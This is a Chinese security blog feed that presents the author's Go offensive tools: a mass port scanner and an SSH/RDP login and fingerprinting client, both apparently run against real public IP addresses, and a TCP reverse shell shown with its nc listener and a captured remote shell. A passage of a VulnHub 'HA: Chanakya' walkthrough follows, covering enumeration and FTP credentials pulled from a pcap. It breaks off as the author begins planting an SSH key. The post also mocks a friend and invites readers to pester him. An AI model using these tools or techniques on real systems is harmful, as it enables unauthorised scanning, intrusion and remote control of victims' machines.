<h2 id="批量扫ip3389端口"><a href="#批量扫ip3389端口" class="headerlink" title="批量扫ip3389端口"></a>批量扫ip3389端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -start-port 3389 -end-port 3389</span><br><span class="line">......</span><br><span class="line">[+] [60.31.205.76] Resolved address is [60.31.205.76]</span><br><span class="line">[+] scanning host: [60.31.205.76], port: [3389]</span><br><span class="line">[+] host [60.31.205.76] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [119.23.85.137] Resolved address is [119.23.85.137]</span><br><span class="line">[+] scanning host: [119.23.85.137], port: [3389]</span><br><span class="line">[+] host [119.23.85.137] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [39.104.21.7] Resolved address is [39.104.21.7]</span><br><span class="line">[+] scanning host: [39.104.21.7], port: [3389]</span><br><span class="line">[+] host [39.104.21.7] opening ports: [3389]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [106.12.118.25] Resolved address is [106.12.118.25]</span><br><span class="line">[+] scanning host: [106.12.118.25], port: [3389]</span><br><span class="line">[+] host [106.12.118.25] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] iplist scan finished!</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/singleport.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>批量快速快速扫描ip文件列表，并遍历65535全端口</li>
<li>ip和域名都能扫</li>
<li>扫描结果以ip:[port]形式放入resultip.txt文件中</li>
<li>支持批量ip单端口扫描</li>
<li>持续添加新功能</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goportscan.exe放在同一目录下即可</li>
</ul>
<h3 id="QQ-or-微信"><a href="#QQ-or-微信" class="headerlink" title="QQ or 微信"></a>QQ or 微信</h3><ul>
<li>1185151867</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>gordpssh-一款轻量级golang实现ssh和rdp管理工具</title>
    <url>/2020/03/25/gordpssh/</url>
    <content><![CDATA[<p><font color="red">有个基佬想要我用go搞个大范围识别ssh和rdp指纹，并将结果写入文件的工具，结果技术太菜，所以产生了下面这个残次品。顺便曝光那个基佬的微信号，大家去调戏他吧，哈哈哈。。。</font></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao1.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao2.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao3.PNG"></li>
</ul>
<h3 id="gordpssh"><a href="#gordpssh" class="headerlink" title="gordpssh"></a>gordpssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">&#123;a light ssh and rdp management tool&#125;</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>By Lucifer11</p>
</li>
<li><p>My QQ:1185151867</p>
</li>
<li><p><a href="https://fdlucifer.github.io/">My Blog</a></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JkcHNzaA==">gordpssh download<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<a id="more"></a>

<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -h</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">Usage [gordpssh] [-s host] [-p port] [-u user] [-w password] [-c cmd]</span><br><span class="line"></span><br><span class="line"> - ssh example:</span><br><span class="line">        1) gordpssh -u root -p 9527 -s 1.1.1.1 -w 123456 -c <span class="string">&quot;uname -a&quot;</span></span><br><span class="line">        2) gordpssh --user root --port 9527 --host 1.1.1.1 --password 123456 --cmd <span class="string">&quot;uname -a&quot;</span></span><br><span class="line"> - <span class="keyword">if</span> use user &amp; pasword; the password is <span class="keyword">for</span> user.</span><br><span class="line"> - rdp example is the same as ssh example.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --cmd string        execute cmd <span class="keyword">in</span> server (default <span class="string">&quot;uname -a&quot;</span>)</span><br><span class="line">  -h, --<span class="built_in">help</span>              this <span class="built_in">help</span></span><br><span class="line">  -s, --host string       remote host addr ip (default <span class="string">&quot; &quot;</span>)</span><br><span class="line">  -w, --password string   <span class="keyword">if</span> use user &amp; password to login; the password is <span class="keyword">for</span> user. (default <span class="string">&quot; &quot;</span>)</span><br><span class="line">  -p, --port int          remote host port (default 22)</span><br><span class="line">  -u, --user string       remote host user (default <span class="string">&quot;root&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/help.jpg"></li>
</ul>
<h3 id="ssh-management"><a href="#ssh-management" class="headerlink" title="ssh management"></a>ssh management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s &lt;ip addr&gt; -p &lt;port&gt; -u &lt;username&gt; -w &lt;password&gt;</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">[+] ssh <span class="built_in">command</span> result is:</span><br><span class="line">Linux yisu-5de4c53d34764 3.10.0-327.el7.x86_64 <span class="comment">#1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">[+] host and ssh port is: 110.42.1.217 22</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/ssh.jpg"></li>
</ul>
<h3 id="rdp-management"><a href="#rdp-management" class="headerlink" title="rdp management"></a>rdp management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s 39.104.21.7 -p 3389 -u adminstrator -w 12345678</span><br><span class="line">...</span><br><span class="line">2</span><br><span class="line">- &#123;your choice [2]&#125;</span><br><span class="line">39.104.21.7:3389</span><br><span class="line">[DEBUG][x224 sendConnectionRequest 0ee000000000000100080003000000]</span><br><span class="line">[DEBUG][tpkt Write 030000130ee000000000000100080003000000]</span><br><span class="line">[DEBUG][GetBytes:  0300]</span><br><span class="line">[DEBUG][tpkt recvHeader 0300 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tptk recvHeader FASTPATH_ACTION_X224, <span class="built_in">wait</span> <span class="keyword">for</span> recvExtendedHeader]</span><br><span class="line">[DEBUG][GetBytes:  0013]</span><br><span class="line">[DEBUG][tpkt recvExtendedHeader 0013 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tpkt <span class="built_in">wait</span> recvData]</span><br><span class="line">[DEBUG][GetBytes:  0ed00000123400020f080002000000]</span><br><span class="line">[DEBUG][tpkt recvData 0ed00000123400020f080002000000 &lt;nil&gt;]</span><br><span class="line">[DEBUG][x224 recvConnectionConfirm 0ed00000123400020f080002000000]</span><br><span class="line">[+] Os Fingerprint is: [0ed00000123400020f080002000000]</span><br><span class="line">[+] os version is 2012R2 OR 8</span><br><span class="line">[INFO][TYPE_RDP_NEG_RSP]</span><br><span class="line">[INFO][*** NLA Security selected ***]</span><br><span class="line">[INFO][StartNLA]</span><br><span class="line">[INFO][StartTLS]</span><br><span class="line">[DEBUG][recvChallenge 30820102a003020106a181fa3081f73081f4a081f10481ee4e544c4d53535000020000001e001e003800000035828a623c69b461abc3866d00000000000000009800980056000000060380250000000f69005a003000330064006f00720066006f006d0079003700340072005a0002001e0069005a003000330064006f00720066006f006d0079003700340072005a0001001e0069005a003000330064006f00720066006f006d0079003700340072005a0004001e0069005a003000330064006f00720066006f006d0079003700340072005a0003001e0069005a003000330064006f00720066006f006d0079003700340072005a0007000800d71b5d074800d60100000000]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/rdp.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量的ssh，rdp管理客户端</li>
<li>连接ssh端口并能使用-c执行linux命令</li>
<li>连接rdp端口</li>
<li>识别rdp端口所在主机的指纹判断主机操作系统类型</li>
<li>持续更新</li>
</ul>
<h3 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h3><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goreverseshell---基于golang的tcp-reverseshell</title>
    <url>/2020/04/09/goreverseshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Reverse-Shell"><a href="#Golang-Tcp-Reverse-Shell" class="headerlink" title="Golang Tcp Reverse Shell"></a>Golang Tcp Reverse Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JldmVyc2VzaGVsbA==">Download goreverseshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage of goreverseshell.exe:</span><br><span class="line">  -host string</span><br><span class="line">        the host to connect (default <span class="string">&quot;input host here&quot;</span>)</span><br><span class="line">  -port int</span><br><span class="line">        nc listenling port (default 5566)</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;goreverseshell.exe -host 192.168.66.6 -port 5566</span><br><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br><span class="line"><span class="string">*ip:192.168.66.6------port:&amp;d</span></span><br><span class="line"><span class="string">%!(EXTRA int=5566)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">lucifer11\hasee</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           LUCIFER11</span><br><span class="line">OS ����:          Microsoft Windows 10 ��ҵ��</span><br><span class="line">OS �汾:          10.0.18363 ��ȱ Build 18363</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     HASEE</span><br><span class="line">ע������:       </span><br><span class="line">��Ʒ ID:          00328-90000-00000-AAOEM</span><br><span class="line">��ʼ��װ����:     2019/9/23, 18:08:18</span><br><span class="line">ϵͳ����ʱ��:     2020/4/8, 15:28:33</span><br><span class="line">ϵͳ������:       HASEE Computer</span><br><span class="line">ϵͳ�ͺ�:         PA70ES                         </span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 ����������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14</span><br><span class="line">Windows Ŀ¼:     C:\WINDOWS</span><br><span class="line">ϵͳĿ¼:         C:\WINDOWS\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume4</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��</span><br><span class="line">�����ڴ�����:     16,231 MB</span><br><span class="line">���õ������ڴ�:   6,104 MB</span><br><span class="line">�����ڴ�: ����: 19,303 MB</span><br><span class="line">�����ڴ�: ����:   4,390 MB</span><br><span class="line">�����ڴ�: ʹ����: 14,913 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WORKGROUP</span><br><span class="line">��¼������:       \\LUCIFER11</span><br><span class="line">�޲�����:         ��װ�� 14 ���޲�������</span><br><span class="line">                  [01]: KB4537572</span><br><span class="line">                  [02]: KB4515383</span><br><span class="line">                  [03]: KB4516115</span><br><span class="line">                  [04]: KB4517245</span><br><span class="line">                  [05]: KB4520390</span><br><span class="line">                  [06]: KB4521863</span><br><span class="line">                  [07]: KB4524244</span><br><span class="line">                  [08]: KB4524569</span><br><span class="line">                  [09]: KB4525419</span><br><span class="line">                  [10]: KB4528759</span><br><span class="line">                  [11]: KB4537759</span><br><span class="line">                  [12]: KB4538674</span><br><span class="line">                  [13]: KB4541338</span><br><span class="line">                  [14]: KB4541335</span><br><span class="line">����:             ��װ�� 8 �� NIC��</span><br><span class="line">                  [01]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line">                      ������:      VMware Network Adapter VMnet1</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 192.168.233.254</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.233.1</span><br><span class="line">                        [02]: fe80::9180:197a:ce35:69b8</span><br><span class="line">                  [02]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line">                      ������:      VMware Network Adapter VMnet8</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.66.1</span><br><span class="line">                        [02]: fe80::9d24:3f2d:1f79:94eb</span><br><span class="line">                  [03]: Intel(R) Wireless-AC 9462</span><br><span class="line">                      ������:      WLAN 2</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [04]: Realtek PCIe GbE Family Controller</span><br><span class="line">                      ������:      ����</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.1.56</span><br><span class="line">                        [02]: fe80::b11f:6ef2:7ec6:6eb3</span><br><span class="line">                  [05]: Bluetooth Device (Personal Area Network)</span><br><span class="line">                      ������:      ������������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [06]: Microsoft KM-TEST Loopback Adapter</span><br><span class="line">                      ������:      Npcap Loopback Adapter</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 255.255.255.255</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 169.254.234.82</span><br><span class="line">                        [02]: fe80::40e5:86bd:7eba:ea52</span><br><span class="line">                  [07]: VirtualBox Host-Only Ethernet Adapter</span><br><span class="line">                      ������:      VirtualBox Host-Only Network</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.56.1</span><br><span class="line">                        [02]: fe80::9429:8e07:8ee2:d61d</span><br><span class="line">                  [08]: TAP-Windows Adapter V9</span><br><span class="line">                      ������:      ��������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">Hyper-V Ҫ��:     ������������ģʽ��չ: ��</span><br><span class="line">                  �������������⻯: ��</span><br><span class="line">                  ������ת��: ��</span><br><span class="line">                  �����б�������: ��</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp reverse shell</li>
<li>支持反弹windows和linux的shell</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goreverseshell.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Chanakya]</title>
    <url>/2019/12/16/HA-Chanakya/</url>
    <content><![CDATA[<p>名称：HA: Chanakya<br>发布日期：2019年11月9日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUl5Q0FlOTFfRWVFTHdqVEZxb1o0X2Z3SEtVUk5CRDQvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19IyCAe91_EeELwjTFqoZ4_fwHKURNBD4/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXA=">https://download.vulnhub.com/ha/chanakya.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXAudG9ycmVudA==">https://download.vulnhub.com/ha/chanakya.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！ 是时候面对Chanakya。<br>您能否解决这个“从根本上启动”并证明自己比较明智？<br>枚举是关键！！！！</p>
<p>级别：中级</p>
<p>任务：枚举目标计算机并获得root用户访问权限。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.130</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:BB:CA:D3 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -sV -Pn -T4 -v --script=vuln 192.168.142.130</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.0.0 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<p>dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:27:13 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/assets/                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/images/                                                         </span><br><span class="line">+ http://192.168.142.130/index.html (CODE:200|SIZE:2382)                                              </span><br><span class="line">+ http://192.168.142.130/server-status (CODE:403|SIZE:280)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/ -X .txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:28:34 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">+ http://192.168.142.130/abuse.txt (CODE:200|SIZE:14)</span><br></pre></td></tr></table></figure>

<p>访问该txt文件发现如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nfubxn.cpncat</span><br></pre></td></tr></table></figure>

<p>使用<span class="exturl" data-url="aHR0cHM6Ly9yb3QxMy5jb20v">rot13.com<i class="fa fa-external-link-alt"></i></span>进行rot13解密，解密出来是ashoka.pcapng，然后访问(<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMC9hc2hva2EucGNhcG5nKSwlRTUlQjAlODYlRTYlQUQlQTQlRTYlOTYlODclRTQlQkIlQjYlRTQlQjglOEIlRTglQkQlQkQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEV3aXJlc2hhcmslRTYlODklOTMlRTUlQkMlODAlRTglQUYlQTUlRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODI=">http://192.168.142.130/ashoka.pcapng),将此文件下载，然后wireshark打开该文件。<i class="fa fa-external-link-alt"></i></span></p>
<p>在Wireshark中打开捕获的文件，然后跟随ftp流量的tcp流，并获得ftp的用户名ashoka和密码kautilya。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub63.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">USER ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">PASS kautilya</span><br><span class="line">230 Login successful.</span><br><span class="line">SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">FEAT</span><br><span class="line">211-Features supported:</span><br><span class="line"> EPRT</span><br><span class="line"> EPSV</span><br><span class="line"> MDTM</span><br><span class="line"> MLST <span class="built_in">type</span>*;perm*;size*;modify*;unique*;unix.mode;unix.uid;unix.gid;</span><br><span class="line"> REST STREAM</span><br><span class="line"> SIZE</span><br><span class="line"> TVFS</span><br><span class="line"> UTF8</span><br><span class="line">211 End FEAT.</span><br><span class="line">OPTS UTF8 ON</span><br><span class="line">501 Invalid argument.</span><br><span class="line">PWD</span><br><span class="line">257 <span class="string">&quot;/&quot;</span> is the current directory.</span><br><span class="line">TYPE A</span><br><span class="line">200 Type <span class="built_in">set</span> to: ASCII.</span><br><span class="line">PASV</span><br><span class="line">227 Entering passive mode (192,168,1,101,177,201).</span><br><span class="line">MLSD</span><br><span class="line">150 File status okay. About to open data connection.</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在有了FTP登录凭据，登录到FTP服务器。 登录后，运行ls命令环顾四周。 发现在根目录中。 因此，决定通过将SSH放置在此位置来完成ssh的操作。 为此，创建一个名为“ .ssh”的目录。 遍历这个新创建的目录后，回到本机终端。</p>
